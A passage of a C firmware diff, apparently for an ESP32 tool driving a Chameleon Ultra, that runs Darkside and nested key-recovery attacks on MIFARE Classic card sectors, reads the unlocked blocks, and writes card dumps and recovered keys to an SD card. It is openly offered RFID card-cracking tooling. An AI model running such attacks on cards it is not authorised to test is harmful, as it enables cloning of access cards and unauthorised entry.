+                TERMINAL_VIEW_ADD_TEXT("Darkside attack on sector %d...\n", sector);
+                
+                uint8_t sector_first_block = sector * 4;
+                
+                // Try Darkside on Key A first
+                if (chameleon_manager_darkside_attack(sector_first_block, MF_KEY_A)) {
+                    printf("  Darkside attack successful for Key A!\n");
+                    printf("  Note: Use offline tools to recover the actual key\n");
+                    TERMINAL_VIEW_ADD_TEXT("  Darkside data collected for Key A\n");
+                    
+                    g_sector_auth[sector].key_a.recovered_by_darkside = true;
+                    g_sector_auth[sector].key_a.attack_data_collected = true;
+                    
+                    // Save darkside data automatically
+                    char darkside_filename[64];
+                    snprintf(darkside_filename, sizeof(darkside_filename), 
+                            "darkside_sector%d_keyA_%02X%02X%02X%02X.txt",
+                            sector, g_last_card_dump.uid[0], g_last_card_dump.uid[1], 
+                            g_last_card_dump.uid[2], g_last_card_dump.uid[3]);
+                    chameleon_manager_save_darkside_data(darkside_filename);
+                } else {
+                    printf("  Darkside attack failed for Key A\n");
+                }
+                
+                vTaskDelay(pdMS_TO_TICKS(500)); // Delay between attacks
+            }
+        }
+    }
+    
+    // Phase 2.5: Attempt Nested attacks using known keys
+    uint16_t sectors_with_keys = 0;
+    for (uint8_t i = 0; i < total_sectors; i++) {
+        if (g_sector_auth[i].auth_success_a || g_sector_auth[i].auth_success_b) {
+            sectors_with_keys++;
+        }
+    }
+    
+    if (sectors_with_keys > 0 && sectors_failed_auth > 0) {
+        printf("\nPhase 2.5: Attempting Nested attacks using known keys...\n");
+        TERMINAL_VIEW_ADD_TEXT("Phase 2.5: Attempting Nested attacks...\n");
+        printf("Found %d sectors with known keys, targeting %d protected sectors\n", 
+               sectors_with_keys, sectors_failed_auth);
+        
+        // For each protected sector, try nested attacks using any known key
+        for (uint8_t target_sector = 0; target_sector < total_sectors; target_sector++) {
+            if (!g_sector_auth[target_sector].auth_success_a && !g_sector_auth[target_sector].auth_success_b) {
+                // Find a sector with a known key to use for nested attack
+                for (uint8_t known_sector = 0; known_sector < total_sectors; known_sector++) {
+                    if (g_sector_auth[known_sector].auth_success_a) {
+                        printf("Sector %d: Nested attack using known key from sector %d...\n", 
+                               target_sector, known_sector);
+                        TERMINAL_VIEW_ADD_TEXT("Nested attack: sector %d -> sector %d\n", 
+                               known_sector, target_sector);
+                        
+                        uint8_t known_block = known_sector * 4;
+                        uint8_t target_block = target_sector * 4;
+                        
+                        // Try to recover Key A for target sector
+                        if (chameleon_manager_nested_attack(known_block, MF_KEY_A, 
+                                                          g_sector_auth[known_sector].key_a.key,
+                                                          target_block, MF_KEY_A)) {
+                            printf("  Nested attack successful for Key A!\n");
+                            TERMINAL_VIEW_ADD_TEXT("  Nested data collected for Key A\n");
+                            
+                            g_sector_auth[target_sector].key_a.recovered_by_nested = true;
+                            g_sector_auth[target_sector].key_a.attack_data_collected = true;
+                            
+                            // Save nested data automatically
+                            char nested_filename[64];
+                            snprintf(nested_filename, sizeof(nested_filename), 
+                                    "nested_sector%d_keyA_%02X%02X%02X%02X.txt",
+                                    target_sector, g_last_card_dump.uid[0], g_last_card_dump.uid[1], 
+                                    g_last_card_dump.uid[2], g_last_card_dump.uid[3]);
+                            chameleon_manager_save_nested_data(nested_filename);
+                        } else {
+                            printf("  Nested attack failed for Key A\n");
+                        }
+                        
+                        // Stop after first successful nested attack per sector
+                        break;
+                    }
+                }
+                
+                vTaskDelay(pdMS_TO_TICKS(500)); // Delay between attacks
+            }
+        }
+    }
+    
+    // Phase 3: Read all accessible blocks using authenticated sectors
+    printf("\nPhase 3: Reading card data from authenticated sectors...\n");
+    TERMINAL_VIEW_ADD_TEXT("Phase 3: Reading card data...\n");
+    
+    for (uint16_t block = 0; block < total_blocks; block++) {
+        // Skip trailer blocks (every 4th block starting from 3) as they contain keys
+        if ((block + 1) % 4 == 0) {
+            continue;
+        }
+        
+        uint8_t sector = block / 4;
+        
+        // Only read if we have authentication for this sector
+        if (g_sector_auth[sector].auth_success_a || g_sector_auth[sector].auth_success_b) {
+            // Re-authenticate before reading (choose Key A if available)
+            bool reauth_success = false;
+            if (g_sector_auth[sector].auth_success_a) {
+                if (authenticate_mifare_block(sector * 4, MF_KEY_A, NULL)) {
+                    reauth_success = true;
+                }
+            } else if (g_sector_auth[sector].auth_success_b) {
+                if (authenticate_mifare_block(sector * 4, MF_KEY_B, NULL)) {
+                    reauth_success = true;
+                }
+            }
+            
+            if (reauth_success) {
+                // Now try to read the block
+                uint8_t block_data[1] = {(uint8_t)block};
+                
+                g_response_received = false;
+                bool result = send_command(CMD_MF1_READ_BLOCK, block_data, 1);
+                if (result && xSemaphoreTake(g_response_sem, pdMS_TO_TICKS(2000)) == pdTRUE) {
+                    if (g_response_received && g_last_response.command == CMD_MF1_READ_BLOCK) {
+                        if ((g_last_response.status == STATUS_SUCCESS || g_last_response.status == 0x00) && 
+                            g_last_response.data_size == 16) {
+                            // Copy block data
+                            memcpy(g_last_card_dump.blocks[block], g_last_response.data, 16);
+                            g_last_card_dump.block_valid[block] = true;
+                            successful_reads++;
+                            
+                            printf("Block %d: ", block);
+                            for (int i = 0; i < 16; i++) {
+                                printf("%02X ", g_last_response.data[i]);
+                            }
+                            printf("\n");
+                        }
+                    }
+                }
+                
+                vTaskDelay(pdMS_TO_TICKS(50));
+            }
+        }
+    }
+    
+    g_last_card_dump.total_blocks_read = successful_reads;
+    g_last_card_dump.card_size_blocks = total_blocks;
+    
+    // Final summary
+    printf("\n=== CARD ANALYSIS COMPLETE ===\n");
+    printf("Blocks read: %d/%d\n", successful_reads, total_blocks - 16); // -16 for trailer blocks
+    printf("Sectors with default keys: %d/%d\n", sectors_authenticated, total_sectors);
+    printf("Sectors requiring Darkside: %d/%d\n", sectors_failed_auth, total_sectors);
+    
+    TERMINAL_VIEW_ADD_TEXT("=== ANALYSIS COMPLETE ===\n");
+    TERMINAL_VIEW_ADD_TEXT("Blocks read: %d/%d\n", successful_reads, total_blocks - 16);
+    TERMINAL_VIEW_ADD_TEXT("Default keys: %d/%d sectors\n", sectors_authenticated, total_sectors);
+    TERMINAL_VIEW_ADD_TEXT("Darkside needed: %d/%d sectors\n", sectors_failed_auth, total_sectors);
+    
+    return true;
+}
+
+bool chameleon_manager_read_lf_card(void) {
+    printf("LF card full dump not yet implemented\n");
+    TERMINAL_VIEW_ADD_TEXT("LF card full dump not yet implemented\n");
+    return false;
+}
+
+bool chameleon_manager_save_card_dump(const char* filename) {
+    if (!g_last_card_dump.valid) {
+        printf("No card dump data to save\n");
+        TERMINAL_VIEW_ADD_TEXT("No card dump data to save\n");
+        return false;
+    }
+    
+    // Create filename if not provided
+    char file_path[128];
+    if (filename == NULL) {
+        struct tm* time_info = localtime(&g_last_card_dump.timestamp);
+        snprintf(file_path, sizeof(file_path), "/mnt/ghostesp/chameleon/card_dump_%04d%02d%02d_%02d%02d%02d.bin",
+                time_info->tm_year + 1900, time_info->tm_mon + 1, time_info->tm_mday,
+                time_info->tm_hour, time_info->tm_min, time_info->tm_sec);
+    } else {
+        snprintf(file_path, sizeof(file_path), "/mnt/ghostesp/chameleon/%s", filename);
+    }
+    
+    // Ensure directory exists
+    sd_card_create_directory("/mnt/ghostesp/chameleon");
+    
+    // Create comprehensive dump content
+    char content[8192];
+    int len = snprintf(content, sizeof(content),
+        "Chameleon Ultra Card Dump\n"
+        "=========================\n"
+        "Timestamp: %s"
+        "Tag Type: %s\n"
+        "UID Size: %d bytes\n"
+        "UID: ",
+        ctime(&g_last_card_dump.timestamp),
+        g_last_card_dump.tag_type,
+        g_last_card_dump.uid_size);
+    
+    // Add UID
+    for (int i = 0; i < g_last_card_dump.uid_size && i < 20; i++) {
+        len += snprintf(content + len, sizeof(content) - len, "%02X ", g_last_card_dump.uid[i]);
+    }
+    
+    len += snprintf(content + len, sizeof(content) - len, 
+        "\nTotal Blocks Attempted: %d\n"
+        "Blocks Successfully Read: %d\n"
+        "Analysis Method: Comprehensive (Default Keys + Darkside Attacks)\n\n"
+        "Sector Authentication Summary:\n"
+        "==============================\n",
+        g_last_card_dump.card_size_blocks,
+        g_last_card_dump.total_blocks_read);
+    
+    // Add sector authentication details
+    for (int sector = 0; sector < MAX_SECTORS; sector++) {
+        len += snprintf(content + len, sizeof(content) - len, "Sector %02d: ", sector);
+        
+        if (g_sector_auth[sector].auth_success_a) {
+            const char* method = "";
+            if (g_sector_auth[sector].key_a.recovered_by_darkside) method = "(DS)";
+            else if (g_sector_auth[sector].key_a.recovered_by_nested) method = "(N)";
+            
+            len += snprintf(content + len, sizeof(content) - len, "Key A=%02X%02X%02X%02X%02X%02X%s ",
+                g_sector_auth[sector].key_a.key[0], g_sector_auth[sector].key_a.key[1],
+                g_sector_auth[sector].key_a.key[2], g_sector_auth[sector].key_a.key[3],
+                g_sector_auth[sector].key_a.key[4], g_sector_auth[sector].key_a.key[5], method);
+        } else if (g_sector_auth[sector].key_a.recovered_by_darkside) {
+            len += snprintf(content + len, sizeof(content) - len, "Key A=Darkside_Data ");
+        } else if (g_sector_auth[sector].key_a.recovered_by_nested) {
+            len += snprintf(content + len, sizeof(content) - len, "Key A=Nested_Data ");
+        } else {
+            len += snprintf(content + len, sizeof(content) - len, "Key A=Unknown ");
+        }
+        
+        if (g_sector_auth[sector].auth_success_b) {
+            const char* method = "";
+            if (g_sector_auth[sector].key_b.recovered_by_darkside) method = "(DS)";
+            else if (g_sector_auth[sector].key_b.recovered_by_nested) method = "(N)";
+            
+            len += snprintf(content + len, sizeof(content) - len, "Key B=%02X%02X%02X%02X%02X%02X%s",
+                g_sector_auth[sector].key_b.key[0], g_sector_auth[sector].key_b.key[1],
+                g_sector_auth[sector].key_b.key[2], g_sector_auth[sector].key_b.key[3],
+                g_sector_auth[sector].key_b.key[4], g_sector_auth[sector].key_b.key[5], method);
+        } else if (g_sector_auth[sector].key_b.recovered_by_darkside) {
+            len += snprintf(content + len, sizeof(content) - len, "Key B=Darkside_Data");
+        } else if (g_sector_auth[sector].key_b.recovered_by_nested) {
+            len += snprintf(content + len, sizeof(content) - len, "Key B=Nested_Data");
+        } else {
+            len += snprintf(content + len, sizeof(content) - len, "Key B=Unknown");
+        }
+        
+        len += snprintf(content + len, sizeof(content) - len, "\n");
+        
+        // Prevent buffer overflow
+        if (len >= sizeof(content) - 200) {
+            break;
+        }
+    }
+    
+    len += snprintf(content + len, sizeof(content) - len, 
+        "\nNote: (DS) indicates Darkside attack data, (N) indicates Nested attack data.\n"
+        "Use offline tools to recover actual keys from attack data.\n\n"
+        "Block Data:\n"
+        "===========\n");
+    
+    // Add block data
+    for (uint16_t block = 0; block < g_last_card_dump.card_size_blocks && block < MAX_CARD_BLOCKS; block++) {
+        if (g_last_card_dump.block_valid[block]) {
+            len += snprintf(content + len, sizeof(content) - len, "Block %03d: ", block);
+            for (int i = 0; i < BLOCK_SIZE; i++) {
+                len += snprintf(content + len, sizeof(content) - len, "%02X ", g_last_card_dump.blocks[block][i]);
+            }
+            len += snprintf(content + len, sizeof(content) - len, "\n");
+        } else {
+            len += snprintf(content + len, sizeof(content) - len, "Block %03d: [UNREAD]\n", block);
+        }
+        
+        // Prevent buffer overflow
+        if (len >= sizeof(content) - 100) {
+            len += snprintf(content + len, sizeof(content) - len, "\n[TRUNCATED - Buffer full]\n");
+            break;
+        }
+    }
+    
+    // Write to SD card
+    esp_err_t result = sd_card_write_file(file_path, content, len);
+    if (result == ESP_OK) {
+        printf("Card dump saved to: %s\n", file_path);
+        TERMINAL_VIEW_ADD_TEXT("Card dump saved to: %s\n", file_path);
+        return true;
+    } else {
+        printf("Failed to save card dump\n");
+        TERMINAL_VIEW_ADD_TEXT("Failed to save card dump\n");
+        return false;
+    }
+}
+
+bool chameleon_manager_save_last_hf_scan(const char* filename) {
+    if (!g_last_hf_scan.valid) {
+        printf("No HF scan data to save\n");
+        TERMINAL_VIEW_ADD_TEXT("No HF scan data to save\n");
+        return false;
+    }
+    
+    // Create filename if not provided
+    char file_path[128];
+    if (filename == NULL) {
+        struct tm* time_info = localtime(&g_last_hf_scan.timestamp);
+        snprintf(file_path, sizeof(file_path), "/mnt/ghostesp/chameleon/hf_scan_%04d%02d%02d_%02d%02d%02d.txt",
+                time_info->tm_year + 1900, time_info->tm_mon + 1, time_info->tm_mday,
+                time_info->tm_hour, time_info->tm_min, time_info->tm_sec);
+    } else {
+        snprintf(file_path, sizeof(file_path), "/mnt/ghostesp/chameleon/%s", filename);
+    }
+    
+    // Ensure directory exists
+    sd_card_create_directory("/mnt/ghostesp/chameleon");
+    
+    // Create file content
+    char content[512];
+    int len = snprintf(content, sizeof(content),
+        "Chameleon Ultra HF Scan Data\n"
+        "============================\n"
+        "Timestamp: %s"
+        "Tag Type: %s\n"
+        "UID Size: %d bytes\n"
+        "UID: ",
+        ctime(&g_last_hf_scan.timestamp),
+        g_last_hf_scan.tag_type,
+        g_last_hf_scan.uid_size);
+    
+    // Add UID bytes
+    for (int i = 0; i < g_last_hf_scan.uid_size && i < 20; i++) {
+        len += snprintf(content + len, sizeof(content) - len, "%02X ", g_last_hf_scan.uid[i]);
+    }
+    len += snprintf(content + len, sizeof(content) - len, "\n\nRaw Data (hex):\n");
+    for (int i = 0; i < g_last_hf_scan.uid_size && i < 20; i++) {
+        len += snprintf(content + len, sizeof(content) - len, "%02X", g_last_hf_scan.uid[i]);
+    }
+    len += snprintf(content + len, sizeof(content) - len, "\n");
+    
+    // Write to SD card
+    esp_err_t result = sd_card_write_file(file_path, content, len);
+    if (result == ESP_OK) {
+        printf("HF scan data saved to: %s\n", file_path);
+        TERMINAL_VIEW_ADD_TEXT("HF scan data saved to: %s\n", file_path);
+        return true;
+    } else {
+        printf("Failed to save HF scan data\n");
+        TERMINAL_VIEW_ADD_TEXT("Failed to save HF scan data\n");
+        return false;
+    }
+}
+
+bool chameleon_manager_save_last_lf_scan(const char* filename) {
+    if (!g_last_lf_scan.valid) {
+        printf("No LF scan data to save\n");
+        TERMINAL_VIEW_ADD_TEXT("No LF scan data to save\n");
+        return false;
+    }
+    
+    // Create filename if not provided
+    char file_path[128];
+    if (filename == NULL) {
+        struct tm* time_info = localtime(&g_last_lf_scan.timestamp);
+        snprintf(file_path, sizeof(file_path), "/mnt/ghostesp/chameleon/lf_scan_%04d%02d%02d_%02d%02d%02d.txt",
+                time_info->tm_year + 1900, time_info->tm_mon + 1, time_info->tm_mday,
+                time_info->tm_hour, time_info->tm_min, time_info->tm_sec);
+    } else {
+        snprintf(file_path, sizeof(file_path), "/mnt/ghostesp/chameleon/%s", filename);
+    }
+    
+    // Ensure directory exists
+    sd_card_create_directory("/mnt/ghostesp/chameleon");
+    
+    // Create file content
+    char content[512];
+    int len = snprintf(content, sizeof(content),
+        "Chameleon Ultra LF Scan Data\n"
+        "============================\n"
+        "Timestamp: %s"
+        "Tag Type: %s\n"
+        "Data Size: %d bytes\n"
+        "Data: ",
+        ctime(&g_last_lf_scan.timestamp),
+        g_last_lf_scan.tag_type,
+        g_last_lf_scan.uid_size);
+    
+    // Add data bytes
+    for (int i = 0; i < g_last_lf_scan.uid_size && i < 20; i++) {
+        len += snprintf(content + len, sizeof(content) - len, "%02X ", g_last_lf_scan.uid[i]);
+    }
+    len += snprintf(content + len, sizeof(content) - len, "\n\nRaw Data (hex):\n");
+    for (int i = 0; i < g_last_lf_scan.uid_size && i < 20; i++) {
+        len += snprintf(content + len, sizeof(content) - len, "%02X", g_last_lf_scan.uid[i]);
+    }
+    len += snprintf(content + len, sizeof(content) - len, "\n");
+    
+    // Write to SD card
+    esp_err_t result = sd_card_write_file(file_path, content, len);
+    if (result == ESP_OK) {
+        printf("LF scan data saved to: %s\n", file_path);
+        TERMINAL_VIEW_ADD_TEXT("LF scan data saved to: %s\n", file_path);
+        return true;
+    } else {
+        printf("Failed to save LF scan data\n");
+        TERMINAL_VIEW_ADD_TEXT("Failed to save LF scan data\n");
+        return false;
+    }
 }
